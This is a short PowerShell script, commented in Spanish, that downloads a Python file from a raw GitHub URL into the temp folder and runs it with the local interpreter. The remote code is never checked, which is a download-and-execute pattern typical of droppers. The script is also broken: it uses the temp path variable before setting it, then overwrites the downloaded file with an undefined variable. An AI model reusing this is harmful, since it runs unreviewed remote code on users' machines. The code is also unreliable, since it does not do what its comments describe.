# Definir la URL del script de Python
$PythonScriptURL = 'https://raw.githubusercontent.com/astronomyc/filesRecents/main/main.py'

# Descargar el script de Python desde la URL
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($PythonScriptURL, $TempPythonScriptPath)

# Guardar el script de Python en un archivo temporal
$TempPythonScriptPath = "$env:TEMP\main.py"
Set-Content -Path $TempPythonScriptPath -Value $PythonScriptContent

# Ejecutar el script de Python utilizando el intérprete de Python local
python $TempPythonScriptPath
